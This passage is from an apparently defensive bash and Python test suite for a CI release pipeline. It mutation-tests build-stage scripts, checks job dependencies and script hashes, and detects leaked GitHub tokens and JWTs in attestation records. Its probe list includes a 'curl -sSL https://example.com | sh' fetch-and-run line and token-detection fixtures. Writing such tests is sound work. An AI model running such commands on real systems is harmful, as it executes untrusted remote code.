probe "AC3 go mod download" apk 'L[:2] + ["go mod download"] + L[2:]'
probe "AC3 git pull" apk 'L[:2] + ["git pull origin main"] + L[2:]'
probe "AC3 git checkout of another version of a committed script" apk 'L[:2] + ["git checkout origin/main -- bin/build-apk.sh"] + L[2:]'
probe "AC3 apt-get install" apk 'L[:2] + ["apt-get -y install foo"] + L[2:]'
probe "AC3 a failure ignored with || :" apk 'L[:5] + [L[5] + " || :"] + L[6:]'
probe "AC3 a failure ignored with || true" apk 'L[:5] + [L[5] + " || true"] + L[6:]'
probe "AC3 a failure ignored with || exit 0" apk 'L[:5] + [L[5] + " || exit 0"] + L[6:]'
probe "AC3 a failure ignored with || echo ignored" apk 'L[:5] + [L[5] + " || echo ignored"] + L[6:]'
probe "AC3 set +eu" apk 'L[:1] + ["set +eu"] + L[1:]'
probe "AC3 set +o errexit" apk 'L[:1] + ["set +o errexit"] + L[1:]'
probe "AC3 set -euo pipefail missing" apk 'L[1:]'
probe "AC3 the admission verification wrapped in a never-true if (rule 58 skipped)" assemble 'L[:2] + ["if [ \"${GITHUB_RUN_ATTEMPT:-1}\" = 0 ]; then"] + L[2:4] + ["fi"] + L[4:]'
probe "AC3 a build backgrounded with &" apk 'L[:5] + [L[5] + " &"] + L[6:]'
probe "AC3 a case dispatch instead of four files" apk '["case \"$1\" in", "apk)"] + L + [";;", "esac"]'
probe "AC3 admission not first" apk 'L[:1] + L[2:3] + L[1:2] + L[3:]'
probe "AC3 no admission script" apk 'L[:1] + L[2:]'
probe "AC3 admission after the build started" apk 'L[:3] + [L[3]] + [L[1]] + L[4:]'
probe "AC6 the stage runs the sysctl itself (cache's scripts do)" apk 'L[:3] + ["sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0"] + L[3:]'
probe "AC6 the stage wraps cache's script in unshare" assemble 'L[:-3] + ["sudo unshare -n " + L[-3]] + L[-2:]'
probe "AC6 a direct melange call" apk 'L[:5] + ["melange build x.yaml"] + L[5:]'
probe "AC11 a direct apko call" assemble 'L[:-3] + ["apko build --lockfile out/production.lock.json build/apko.yaml fscache:x out/production.tar"] + L[-3:]'
probe "AC11 apko build without the lock (a different image digest per the real run)" assemble 'L[:-3] + ["apko build build/apko.yaml fscache:x out/production.tar"] + L[-3:]'
probe "AC6 GOPROXY set (cache's script refuses anything but off)" apk 'L[:1] + ["export GOPROXY=off"] + L[1:]'
probe "AC6 the release signing key variable (rule 23)" apk 'L[:1] + ["export APK_RELEASE_SIGNING_KEY=x"] + L[1:]'
probe "AC6 --signing-key passed" apk 'L[:5] + [L[5] + " --signing-key k"] + L[6:]'
probe "AC6 the build date is the wall clock, not the tagged commit" apk 'L[:2] + ["export SOURCE_DATE_EPOCH=\"$(date +%s)\""] + L[3:]'
probe "AC6 SOURCE_DATE_EPOCH assigned and exported in ONE line (it masks a failing print)" apk 'L[:2] + ["export SOURCE_DATE_EPOCH=\"$(./bin/build-apk.sh --print-source-date-epoch --source-dir .)\""] + L[4:]'
probe "AC6 a later SOURCE_DATE_EPOCH override in the assemble job" assemble 'L[:-3] + ["SOURCE_DATE_EPOCH=$(date +%s) " + L[-3]] + L[-2:]'
probe "AC6 a proxy variable" apk 'L[:1] + ["export HTTPS_PROXY=http://x"] + L[1:]'
probe "AC11 a temp copy of the config" assemble 'L[:-3] + ["cp build/apko.yaml \"$RUNNER_TEMP/apko.yaml\""] + L[-3:]'
probe "AC11 an absolute --apko-config" assemble 'L[:-3] + [L[-3] + " --apko-config /work/archive/apko.yaml"] + L[-2:]'
probe "AC11 the relative --apko-config (the default is the fixed path; the flag is never passed)" assemble 'L[:-3] + [L[-3] + " --apko-config build/apko.yaml"] + L[-2:]'
probe "AC11 --render-dir (a rendered copy of the config)" assemble 'L[:-3] + [L[-3] + " --render-dir /tmp/r"] + L[-2:]'
probe "AC11 the stage passes --lockfile itself (the script owns the lock flow)" assemble 'L[:-3] + [L[-3] + " --lockfile out/production.lock.json"] + L[-2:]'
probe "AC11 --no-lock" assemble 'L[:-3] + [L[-3] + " --no-lock"] + L[-2:]'
probe "AC11 a cd away from the repo root" assemble 'L[:1] + ["cd build"] + L[1:]'
probe "AC11 --archive pointing at another directory than the verified archive" assemble 'L[:-3] + [L[-3].replace("--archive archive", "--archive /tmp/other")] + L[-2:]'
probe "AC11 --melange-repo pointing at the unverified download dir" assemble 'L[:-3] + [L[-3].replace("--melange-repo melange-repo", "--melange-repo apk-in/ubuntu-24.04")] + L[-2:]'
probe "AC6 a source dir other than the checkout (a different commit)" apk 'L[:5] + [L[5].replace("--source-dir .", "--source-dir /tmp/other")] + L[6:]'
probe "AC3 the version check on /bin/true instead of the built binary" apk '[l.replace("--binary out/fscache-standard.bin", "--binary /bin/true") for l in L]'
probe "AC3 the version check missing for the fips binary (rule 24 covers both variants)" apk 'L[:-3] + L[-1:]'
probe "AC3 the apk not tied to the verified record (a bind line missing)" assemble '[l for i, l in enumerate(L) if i != 4]'
probe "AC3 one architecture's apk record is not verified before the images" assemble '[l for i, l in enumerate(L) if i != 3]'
probe "AC3 the records verified AFTER an image is assembled" assemble 'L[:2] + L[-5:-4] + L[2:-5] + L[-4:]'
probe "AC3 no policy made for the tag before verifying" assemble 'L[:1] + L[2:]'
probe "AC3 verified as the wrong stage" assemble '[l.replace("--stage build --record witness-apk-in/ubuntu-24.04/", "--stage rebuild --record witness-apk-in/ubuntu-24.04/", 1) for l in L]'
probe "AC9 digests.json forged by a plain write after the merge" assemble 'L + ["printf \x27{\"image-production\":\"sha256:%064d\"}\x27 7 > digests.json"]'
probe "AC9 no digests.json (the merge line missing)" assemble '[l for l in L if "items-merge" not in l]'
probe "AC9 digests.json written by hand instead of by items-merge" assemble '[l for l in L if "items-merge" not in l] + ["echo {} > digests.json"]'
probe "005-AC1 Rebuild: Build's record not verified FIRST (stage-start after the build)" rebuild-apk 'L[:2] + L[3:5] + L[2:3] + L[5:]'
probe "005-AC1 Rebuild: extra command between policy and stage-start" rebuild-apk 'L[:2] + ["python3 bin/build-admit.py run"] + L[2:]'
probe "005-AC2 no comparison" rebuild-assemble 'L[:-1]'
probe "005-AC2 the comparison against Rebuild's own items" rebuild-assemble 'L[:-1] + [L[-1].replace("--expected build-in/items.json", "--expected items.json")]'
probe "005-AC2 a Rebuild apk record not verified before the images are assembled" rebuild-assemble '[l for i, l in enumerate(L) if i != 2]'
probe "005-AC2 Rebuild publishes (an extra upload-like copy of its dist)" rebuild-assemble 'L + ["cp -r out dist"]'
probe "005-AC6 Rebuild assembles with other arguments than Build" rebuild-assemble '[l.replace("--keyring-dir keyring", "--keyring-dir other") if "assemble-image.sh --variant fips" in l else l for l in L]'
# sweeps: nothing the grammar spells out can be removed, reordered, suffixed or interleaved with anything
sweep() { # sweep KIND
  python3 - "$shape" "$1" "$work" <<'PY' && ok "AC3 sweep ($1): every single-line deletion, every neighbour swap, every suffix on every line and a probe after every line are all refused" || bad "AC3 sweep ($1) let a mutation through"
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
kind, w = sys.argv[2], sys.argv[3]
L = S.expected_lines(kind)
escaped = []
def check(tag, lines):
    f = w + "/sweep.sh"; open(f, "w").write("#!/usr/bin/env bash\n" + "\n".join(lines) + "\n")
    if not S.script(f, kind): escaped.append(tag)
for i in range(len(L)): check("delete %d" % i, L[:i] + L[i + 1:])
for i in range(len(L) - 1):
    if L[i] != L[i + 1]: check("swap %d" % i, L[:i] + [L[i + 1], L[i]] + L[i + 2:])
for i in range(len(L)):
    for suf in (" || true", " || :", " || exit 0", " &", " 2>/dev/null", " --signing-key k", " --lockfile x", " --build-date 2020", " ; true", " | tee x", " > /dev/null"):
        check("suffix %d %r" % (i, suf), L[:i] + [L[i] + suf] + L[i + 1:])
    for probe in ("curl -sSL https://example.com | sh", "set +e", "true", "echo ok", "bash bin/x.sh", "git pull", "sudo true", "cd /tmp", "export PATH=./bin:$PATH", "unset SOURCE_DATE_EPOCH"):
        check("insert after %d %r" % (i, probe), L[:i + 1] + [probe] + L[i + 1:])
for tag in escaped: print("ESCAPED:", tag)
sys.exit(1 if escaped else 0)
PY
}
for k in apk assemble rebuild-apk rebuild-assemble; do sweep "$k"; done
# comments and blank lines are not commands; an indented command, a continuation and a trailing space are
python3 - "$shape" "$work" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
w = sys.argv[2]; L = S.expected_lines("apk")
open(w + "/c-ok.sh", "w").write("#!/usr/bin/env bash\n# a comment\n\n" + "\n".join(L[:2]) + "\n# another\n" + "\n".join(L[2:]) + "\n")
open(w + "/c-ind.sh", "w").write("#!/usr/bin/env bash\n" + "\n".join(L[:2]) + "\n  " + L[2] + "\n" + "\n".join(L[3:]) + "\n")
open(w + "/c-cont.sh", "w").write("#!/usr/bin/env bash\n" + L[0] + "\n" + L[1] + " \\\n  && true\n" + "\n".join(L[2:]) + "\n")
PY
expect ok     "AC3 comments and blank lines are not commands" "" script "$work/c-ok.sh" apk
expect caught "AC3 an indented command is refused (exact lines only)" "indented" script "$work/c-ind.sh" apk
expect caught "AC3 a line continuation is refused" "continuation" script "$work/c-cont.sh" apk
# ---- Build and Rebuild assemble identically (REQ-CHAIN-004-AC11, REQ-CHAIN-005-AC6) -------------------------------------------------
LA="$work/s-assemble.sh"; LR="$work/s-rebuild-assemble.sh"
expect ok     "AC11/005-AC6 fixture: Build and Rebuild assemble with the same script and arguments; no stage file names apko" "" lockflow "$LA" "$LR" "$work/build.yml" "$work/rebuild.yml"
mutate "$LR" "$work/lf_date.sh" '(assemble-image\.sh --variant production)' '\1 --build-date 2026-10-09T00:00:00Z' && expect caught "005-AC6 Rebuild passes its own --build-date" "not identical" lockflow "$LA" "$work/lf_date.sh"
mutate "$LR" "$work/lf_ver.sh" '(assemble-image\.sh --variant production --version )"\$\{GITHUB_REF_NAME#v\}"' '\1"9.9.9"' && expect caught "005-AC6 Rebuild's version differs from Build's" "not identical" lockflow "$LA" "$work/lf_ver.sh"
mutatel "$work/build.yml" "$work/lf_wfapko.yml" 'run: bash bin/witnessed.sh build bin/build-stage-assemble.sh' 'run: bash bin/witnessed.sh build bin/build-stage-assemble.sh && apko build build/apko.yaml fscache:x out.tar' && expect caught "AC11 a stage workflow names apko in a run step" apko lockflow "$LA" "$LR" "$work/lf_wfapko.yml"
# ---- the scripts are listed with their sha256 (PR 1's chain-scripts.json design) --------------------------------------------------------
mkdir -p "$work/lr/bin"; for k in apk assemble rebuild-apk rebuild-assemble; do cp "$work/s-$k.sh" "$work/lr/bin/build-stage-$k.sh"; done; cp "$work/witnessed.sh" "$work/lr/bin/witnessed.sh"
expect ok     "AC3 fixture: the five scripts (the four stage scripts and bin/witnessed.sh) are rows of chain-scripts.json and the listed sha256 is the committed bytes hash" "" listed "$work/chain-scripts.json" "$work/lr"
echo '# changed after listing' >> "$work/lr/bin/build-stage-apk.sh"
expect caught "AC3 a script changed after it was listed is refused (the sha256 binding)" "sha256" listed "$work/chain-scripts.json" "$work/lr"
python3 - "$work" <<'PY'
import json, sys
d = json.load(open(sys.argv[1] + "/chain-scripts.json")); d["scripts"] = d["scripts"][1:]; json.dump(d, open(sys.argv[1] + "/chain-scripts-short.json", "w"))
PY
expect caught "AC3 a script that is not a row of chain-scripts.json is refused" "not a row" listed "$work/chain-scripts-short.json" "$work/lr"
# ---- the job graph of release.yml (REQ-CHAIN-005-AC5) --------------------------------------------------------------------------------
expect ok     "005-AC5 fixture: build -> (rebuild || check) -> release, sign beside them, other jobs ignored" "" graph "$work/release.yml"
g() { mutate "$work/release.yml" "$work/$1.yml" "$2" "$3" && expect caught "$4" "$5" graph "$work/$1.yml"; return 0; }
g g1 '  rebuild:\n    needs: build' '  rebuild:\n    needs: [build, check]' "005-AC5 rebuild waits for check" "rebuild must need exactly"
g g2 '  check:\n    needs: build' '  check:\n    needs: [build, rebuild]' "005-AC5 check waits for rebuild" "check must need exactly"
g g3 'needs: \[rebuild, check, sign\]' 'needs: [check, sign]' "005-AC5 release does not need rebuild" "release must need exactly"
g g4 '  sign:\n    needs: build' '  sign:\n    needs: check' "005-AC5 sign does not need build" "sign must need exactly"
g g5 '  rebuild:\n    needs: build' '  rebuild:\n    needs: build\n    if: always()' "005-AC5 rebuild runs even when build failed" "keys outside"
g g6 '  release:\n    needs: \[rebuild, check, sign\]' '  release:\n    if: always()\n    needs: [rebuild, check, sign]' "005-AC5 release runs when a stage failed (if: always())" "keys outside"
g g7 '  release:\n    needs: \[rebuild, check, sign\]' '  release:\n    if: ${{ !cancelled() }}\n    needs: [rebuild, check, sign]' "005-AC5 release runs when a stage failed (!cancelled())" "keys outside"
g g8 '  rebuild:\n    needs: build' '  rebuild:\n    continue-on-error: true\n    needs: build' "005-AC5 a failed rebuild does not fail the run (continue-on-error)" "keys outside"
g g9 '  check:\n    needs: build\n    uses: ./.github/workflows/stage-verify.yml' '  check:\n    needs: build\n    uses: ./.github/workflows/stage-promote.yml' "005-AC5 check calls another stage file" "check must call exactly"
g g10 '(  rebuild:\n    needs: build\n    uses: ./.github/workflows/stage-reproducibility.yml)' '\1\n    secrets: inherit' "005-AC5 secrets: inherit on a stage call" "keys outside"
g g11 '  rebuild:' '  reproducibility:' "005-AC5 the Rebuild job is not named rebuild (a failure would not name the stage)" "rebuild is missing"
g g12 '  release:\n    needs: \[rebuild, check, sign\]\n    uses: ./.github/workflows/stage-promote.yml' '  release:\n    needs: [rebuild, check]\n    uses: ./.github/workflows/stage-promote.yml' "005-AC5 release without sign" "release must need exactly"
# ---- the Witness record never holds the token variables (REQ-CHAIN-004-AC8): the judge, then the product check ----------------------
python3 - "$work" <<'PY'
import base64, json, sys
w = sys.argv[1]
def env_of(statement):
    return {"payloadType": "application/vnd.in-toto+json", "payload": base64.b64encode(json.dumps(statement).encode()).decode(), "signatures": []}
def coll(env_vars, extra=None):
    att = [{"type": "https://witness.dev/attestations/environment/v0.1", "attestation": {"os": "linux", "hostname": "runner", "username": "runner", "variables": env_vars}},
           {"type": "https://witness.dev/attestations/command-run/v0.1", "attestation": {"cmd": ["./bin/build-stage-apk.sh"], "exitcode": 0}}]
    if extra: att.append(extra)
    return {"_type": "https://in-toto.io/Statement/v0.1", "predicateType": "https://witness.testifysec.com/attestation-collection/v0.1",
            "subject": [{"name": "https://witness.dev/attestations/product/v0.1/file:digests.json", "digest": {"sha256": "a" * 64}}],
            "predicate": {"name": "apk", "attestations": att}}
clean = {"GITHUB_SHA": "abc", "GITHUB_REF_NAME": "v0.3.0", "RUNNER_TEMP": "/home/runner/work/_temp"}
cases = {"env_clean": coll(clean),
         "env_masked": coll(dict(clean, ACTIONS_ID_TOKEN_REQUEST_TOKEN="******")),
         "env_value": coll(dict(clean, ACTIONS_ID_TOKEN_REQUEST_TOKEN="abcdef0123456789")),
         "env_url": coll(dict(clean, ACTIONS_ID_TOKEN_REQUEST_URL="https://pipelines.actions.githubusercontent.com/x?api-version=2.0")),
         "env_runtime": coll(dict(clean, ACTIONS_RUNTIME_TOKEN="******")),
         "env_ghtoken": coll(dict(clean, GH_TOKEN="******")),
         "env_ghtoken2": coll(dict(clean, GITHUB_TOKEN="******")),
         "env_ghs": coll(dict(clean, SOMETHING="ghs_" + "A" * 36)),
         "env_jwt": coll(dict(clean, SOMETHING="eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJyZXBvIn0.c2lnbmF0dXJl")),
         "env_other_att": coll(clean, {"type": "https://witness.dev/attestations/github/v0.1", "attestation": {"jwt": {"claims": {"sub": "repo:x"}, "raw": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJyZXBvIn0.c2lnbmF0dXJl"}}})}
for k, v in cases.items():
    json.dump(env_of(v), open("%s/%s.json" % (w, k), "w"))      # every record is a DSSE envelope: the names sit inside base64
json.dump(coll(clean), open(w + "/env_bare.json", "w"))          # a bare Statement is not what Witness -o writes
# the obfuscated case: the variable NAME appears only inside the base64 payload (a text search of the file finds nothing)
raw = open(w + "/env_masked.json").read()
assert "ACTIONS_ID_TOKEN_REQUEST_TOKEN" not in raw, "fixture: the name must be hidden inside the base64 payload"
PY
expect ok     "AC8 fixture: a clean environment record (a DSSE envelope) passes the judge" "" recordenv "$work/env_clean.json"
expect caught "AC8 judge: ACTIONS_ID_TOKEN_REQUEST_TOKEN inside the base64 payload (a text search of the file would miss it)" ACTIONS_ID_TOKEN_REQUEST_TOKEN recordenv "$work/env_masked.json"
expect caught "AC8 judge: ACTIONS_ID_TOKEN_REQUEST_URL" ACTIONS_ID_TOKEN_REQUEST_URL recordenv "$work/env_url.json"
expect caught "AC8 judge: ACTIONS_RUNTIME_TOKEN" ACTIONS_RUNTIME_TOKEN recordenv "$work/env_runtime.json"
expect caught "AC8 judge: GH_TOKEN (the admission token must not be recorded either)" GH_TOKEN recordenv "$work/env_ghtoken.json"
expect caught "AC8 judge: GITHUB_TOKEN" GITHUB_TOKEN recordenv "$work/env_ghtoken2.json"
expect caught "AC8 judge: a GitHub token value in any variable" "GitHub token" recordenv "$work/env_ghs.json"
expect caught "AC8 judge: a compact JWT in the github attestor's raw token" JWT recordenv "$work/env_other_att.json"
expect caught "AC8 judge: a bare Statement is not the shape Witness writes" "DSSE" recordenv "$work/env_bare.json"
CV="$root/bin/chain-verify.py"
run_cv() { local rc=0; python3 "$CV" "$@" > "$work/cv.out" 2> "$work/cv.err" || rc=$?; echo "$rc"; }
rec_expect() { # rec_expect ok|refuse LABEL WORD FILE
  local want=$1 label=$2 word=$3 f=$4 rc; rc=$(run_cv record-env --record "$f")
  if grep -q Traceback "$work/cv.err" 2> /dev/null; then bad "$label -> a Python traceback is a crash, not a refusal"; return; fi
  if [ "$want" = ok ]; then [ "$rc" = 0 ] && ok "$label" || bad "$label -> exit $rc: $(head -c 160 "$work/cv.err" | tr '\n' ' ')"
  else if [ "$rc" = 1 ] && head -1 "$work/cv.err" | grep -Eq '^refused at (build|rebuild): ' && grep -Fq -- "$word" "$work/cv.err"; then ok "$label"; else bad "$label -> exit $rc, wanted 1 'refused at <stage>:' naming '$word': $(head -c 160 "$work/cv.err" | tr '\n' ' ')"; fi; fi
}
[ -f "$CV" ] && ok "bin/chain-verify.py exists" || bad "bin/chain-verify.py does not exist (RED: not implemented yet)"
rec_expect ok     "AC8 chain-verify record-env: a clean DSSE record is accepted" "" "$work/env_clean.json"
rec_expect refuse "AC8 chain-verify record-env: a masked ACTIONS_ID_TOKEN_REQUEST_TOKEN inside the base64 payload is refused and named" ACTIONS_ID_TOKEN_REQUEST_TOKEN "$work/env_masked.json"
rec_expect refuse "AC8 chain-verify record-env: a real-looking value is refused and named" ACTIONS_ID_TOKEN_REQUEST_TOKEN "$work/env_value.json"
rec_expect refuse "AC8 chain-verify record-env: ACTIONS_ID_TOKEN_REQUEST_URL" ACTIONS_ID_TOKEN_REQUEST_URL "$work/env_url.json"
rec_expect refuse "AC8 chain-verify record-env: ACTIONS_RUNTIME_TOKEN" ACTIONS_RUNTIME_TOKEN "$work/env_runtime.json"
rec_expect refuse "AC8 chain-verify record-env: GH_TOKEN" GH_TOKEN "$work/env_ghtoken.json"
rec_expect refuse "AC8 chain-verify record-env: a GitHub token value" "GitHub token" "$work/env_ghs.json"
rec_expect refuse "AC8 chain-verify record-env: a compact JWT in a variable value" JWT "$work/env_jwt.json"
rec_expect refuse "AC8 chain-verify record-env: the github attestor's raw token" JWT "$work/env_other_att.json"
rc=$(run_cv record-env --record "$work/does-not-exist.json"); [ -f "$CV" ] && [ "$rc" = 2 ] && ok "AC8 a missing record is a usage error (exit 2), not a clean pass" || bad "AC8 a missing record exit $rc, wanted 2 (and the script must exist)"
# ---- the stage scripts RUN against fake cache scripts (REQ-CHAIN-004-AC3, AC6, AC9; REQ-CHAIN-005-AC2) -----------------------------
# bin/chain-test-harness.py builds a throw-away tree; every fake output is a pure function of its inputs, so the expected digests.json and
# items.json are computed by the ORACLE there, never from anything the implementation wrote. A harness that cannot fail proves nothing:
# the same cases run against the known-good fixtures first (the oracle model of items-apk / items-merge stands behind the fake
# chain-verify.py), then against the real bin/build-stage-KIND.sh with the REAL chain-verify.py items subcommands.
HX() { env HARNESS_DIR="$root/bin" REAL_CV="$CV" "$@"; }
mk() { python3 "$harness" mktree "$1" "$2" "$3" "${4:-oracle}"; }
run_stage() { # run_stage DIR KIND [ENV=VAL...] -> prints the exit status
  local d=$1 k=$2; shift 2; (cd "$d" && HX env "$@" GITHUB_REF_NAME=v0.3.0 GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 HARNESS_DIR="$root/bin" REAL_CV="$CV" \
    ACTIONS_ID_TOKEN_REQUEST_TOKEN=SENTINEL-TOKEN bash "./bin/build-stage-$k.sh" > stage.out 2> stage.err; echo $?)
}
firstcall() { sed -n "$2p" "$1/calls.log" 2> /dev/null || true; }
nth() { grep -n "$2" "$1/calls.log" 2> /dev/null | head -1 | cut -d: -f1; }
beh_missing() { local tag=$1; shift; for l in "$@"; do bad "$l ($tag: bin/build-stage-KIND.sh does not exist: RED until implemented)"; done; }
for tag in fixture real; do
  for k in apk assemble rebuild-apk rebuild-assemble; do
    if [ "$tag" = fixture ]; then eval "S_$(tr - _ <<< "$k")=\"$work/s-$k.sh\""; else eval "S_$(tr - _ <<< "$k")=\"$root/bin/build-stage-$k.sh\""; fi
  done
  mode=oracle; [ "$tag" = real ] && mode=real
  # ---- apk
  if [ ! -f "$S_apk" ]; then
    beh_missing "$tag" "AC3 $tag apk: admission is the first call, then both variants build, then the version checks" "AC6 $tag apk: SOURCE_DATE_EPOCH (the tagged commit's time from cache's script) reaches every build" \
      "AC3 $tag apk: a refused admission runs nothing else" "AC6 $tag apk: a failing --print-source-date-epoch stops the job before any build" "AC6 $tag apk: build-apk.sh exit 2 stops before the version checks" \
      "AC6 $tag apk: build-apk.sh exit 4 (a network attempt in the sealed call) stops before the version checks" "AC3 $tag apk: a refused version check fails the job and leaves no items fragment" \
      "AC9 $tag apk: items-apk.json holds exactly the oracle's fragment" "AC6 $tag apk: the stage sets none of the variables cache's script refuses"
  else
    d="$work/t-$tag-apk"; mk "$d" apk "$S_apk" "$mode" > /dev/null; rc=$(run_stage "$d" apk ITEMS_MODE=$mode); calls=$(cat "$d/calls.log")
    nb=$(grep -c '^apk ' <<< "$calls"); nv=$(nth "$d" '^version'); nlastb=$(grep -n '^apk ' "$d/calls.log" | tail -1 | cut -d: -f1)
    if [ "$rc" = 0 ] && [ "$(sed -n 1p <<< "$calls")" = admit ] && [ "$nb" = 2 ] && [ "$(grep -c '^version ' <<< "$calls")" = 2 ] && [ -n "$nv" ] && [ "$nv" -gt "$nlastb" ]; then ok "AC3 $tag apk: admission is the first call, then both variants build, then the version checks"; else bad "AC3 $tag apk: exit $rc, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"; fi
    if [ "$nb" = 2 ] && ! grep -q 'SDE=unset' <<< "$calls" && [ "$(grep -c 'SDE=1700000000' <<< "$calls")" = 2 ]; then ok "AC6 $tag apk: SOURCE_DATE_EPOCH (the tagged commit's time from cache's script) reaches every build"; else bad "AC6 $tag apk: SOURCE_DATE_EPOCH not exported to every build: $calls"; fi
    rm -rf "$d"; mk "$d" apk "$S_apk" "$mode" > /dev/null; rc=$(run_stage "$d" apk ITEMS_MODE=$mode FAKE_ADMIT_RC=1); calls=$(cat "$d/calls.log")
    [ "$rc" != 0 ] && [ "$calls" = admit ] && ok "AC3 $tag apk: a refused admission runs nothing else (no script is called)" || bad "AC3 $tag apk: after a refused admission rc=$rc calls=$calls"
    rm -rf "$d"; mk "$d" apk "$S_apk" "$mode" > /dev/null; rc=$(run_stage "$d" apk ITEMS_MODE=$mode FAKE_SDE_RC=1); calls=$(cat "$d/calls.log")
    [ "$rc" != 0 ] && ! grep -q '^apk ' <<< "$calls" && ok "AC6 $tag apk: a failing --print-source-date-epoch stops the job before any build (the export cannot mask it)" || bad "AC6 $tag apk: failing SDE print -> rc=$rc calls=$calls"
    for rcv in 2 4; do
      rm -rf "$d"; mk "$d" apk "$S_apk" "$mode" > /dev/null; rc=$(run_stage "$d" apk ITEMS_MODE=$mode FAKE_APK_RC=$rcv); calls=$(cat "$d/calls.log")
      [ "$rc" != 0 ] && ! grep -q '^version' <<< "$calls" && ok "AC6 $tag apk: build-apk.sh exit $rcv ($([ $rcv = 4 ] && echo 'a network attempt in the sealed call, FIXED by cache tests' || echo 'a named refusal')) stops before the version checks" || bad "AC6 $tag apk: exit $rcv -> rc=$rc calls=$calls"
    done
    rm -rf "$d"; mk "$d" apk "$S_apk" "$mode" > /dev/null; rc=$(run_stage "$d" apk ITEMS_MODE=$mode FAKE_VERSION_RC=1)
    [ "$rc" != 0 ] && [ ! -e "$d/items-apk.json" ] && ok "AC3 $tag apk: a refused version check fails the job and leaves no items fragment" || bad "AC3 $tag apk: version refusal -> rc=$rc, items-apk.json present=$([ -e "$d/items-apk.json" ] && echo yes || echo no)"
    rm -rf "$d"; mk "$d" apk "$S_apk" "$mode" > /dev/null; rc=$(run_stage "$d" apk ITEMS_MODE=$mode)
    arch=$(uname -m); exp=$(python3 - "$harness" "$d" "$arch" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("h", sys.argv[1]); h = importlib.util.module_from_spec(spec); spec.loader.exec_module(h)
print(json.dumps(h.frag(sys.argv[2] + "/out", sys.argv[3]), sort_keys=True))
PY
    ) || exp=""
    got=$(python3 -c 'import json,sys; print(json.dumps(json.load(open(sys.argv[1])), sort_keys=True))' "$d/items-apk.json" 2> /dev/null || true)
    [ "$rc" = 0 ] && [ -n "$exp" ] && [ "$got" = "$exp" ] && ok "AC9 $tag apk: items-apk.json holds exactly the oracle's fragment" || bad "AC9 $tag apk: rc=$rc, items-apk.json differs from the oracle (got '${got:0:80}')"
    if [ -f "$d/env-apk.txt" ] && ! grep -Eq '^(APK_RELEASE_SIGNING_KEY|GOPROXY|HTTPS_PROXY|HTTP_PROXY|https_proxy)=' "$d/env-apk.txt"; then ok "AC6 $tag apk: the stage sets none of the variables cache's script refuses"; else bad "AC6 $tag apk: a refused variable reached build-apk.sh"; fi
  fi
  # ---- assemble
  if [ ! -f "$S_assemble" ]; then
    beh_missing "$tag" "AC3 $tag assemble: both records are verified, then every file is bound, then the repo is built, then the images" "AC3 $tag assemble: a refused apk record stops the job before any image" \
      "AC3 $tag assemble: an apk whose bytes differ from the verified record stops the job before any image (rule 58)" "AC6 $tag assemble: assemble-image.sh failing (exit 4) leaves no digests.json" \
      "AC9 $tag assemble: digests.json holds exactly the oracle's digests (images and apks)" "AC9 $tag assemble: items.json holds exactly the oracle's 25 items" \
      "AC9 $tag assemble: digests.json passes PR 1's schema and equals items.json for the same logical digests" "AC6 $tag assemble: SOURCE_DATE_EPOCH reaches both image builds" \
      "AC3 $tag assemble: the melange repo holds both architectures' apks (distinct directories, never merged by download)"
  else
    d="$work/t-$tag-asm"; mk "$d" assemble "$S_assemble" "$mode" > /dev/null; rc=$(run_stage "$d" assemble ITEMS_MODE=$mode); calls=$(cat "$d/calls.log")
    nver=$(grep -n '^verify verify ' "$d/calls.log" | tail -1 | cut -d: -f1); nbind=$(grep -n '^verify bind ' "$d/calls.log" | tail -1 | cut -d: -f1); nimg=$(nth "$d" '^image ')
    if [ "$rc" = 0 ] && [ "$(grep -c '^verify verify --stage build' <<< "$calls")" = 2 ] && [ "$(grep -c '^verify bind ' <<< "$calls")" = 8 ] && [ -n "$nver" ] && [ -n "$nbind" ] && [ -n "$nimg" ] && [ "$nver" -lt "$nbind" ] && [ "$nbind" -lt "$nimg" ]; then ok "AC3 $tag assemble: both records are verified, then every file is bound, then the repo is built, then the images"; else bad "AC3 $tag assemble: rc=$rc verify=$nver bind=$nbind image=$nimg"; fi
    [ "$(grep -c 'SDE=1700000000' <<< "$calls")" = 2 ] && ! grep -q 'SDE=unset' <<< "$calls" && ok "AC6 $tag assemble: SOURCE_DATE_EPOCH reaches both image builds" || bad "AC6 $tag assemble: SOURCE_DATE_EPOCH missing on an image build"
    [ -f "$d/melange-repo/x86_64/fscache-0.3.0-r0.apk" ] && [ -f "$d/melange-repo/aarch64/fscache-0.3.0-r0.apk" ] && ok "AC3 $tag assemble: the melange repo holds both architectures' apks (distinct directories, never merged by download)" || bad "AC3 $tag assemble: the melange repo is incomplete"
    expd=$(python3 "$harness" expect "$d" assemble digests 2> /dev/null || true); expi=$(python3 "$harness" expect "$d" assemble items 2> /dev/null || true)
    gotd=$(python3 -c 'import json,sys; print(json.dumps(json.load(open(sys.argv[1])), sort_keys=True))' "$d/digests.json" 2> /dev/null || true)
    goti=$(python3 -c 'import json,sys; print(json.dumps(json.load(open(sys.argv[1])), sort_keys=True))' "$d/items.json" 2> /dev/null || true)
    [ "$rc" = 0 ] && [ -n "$expd" ] && [ "$gotd" = "$expd" ] && ok "AC9 $tag assemble: digests.json holds exactly the oracle's digests (images and apks)" || bad "AC9 $tag assemble: rc=$rc digests.json differs from the oracle (got '${gotd:0:100}')"
    [ "$rc" = 0 ] && [ -n "$expi" ] && [ "$goti" = "$expi" ] && ok "AC9 $tag assemble: items.json holds exactly the oracle's 25 items" || bad "AC9 $tag assemble: rc=$rc items.json differs from the oracle (got '${goti:0:100}')"
    if [ -n "$gotd" ] && [ -n "$goti" ] && python3 - "$d" <<'PY'
import json, re, sys
d = sys.argv[1]
j = json.load(open(d + "/digests.json")); it = json.load(open(d + "/items.json"))
assert isinstance(j, dict) and len(j) == 6, "digests.json must hold exactly the six digests"
for k, v in j.items():                         # PR 1's schema (REQ-CHAIN-001-AC2): names [a-z0-9-]+, values sha256:<64 lower-case hex>
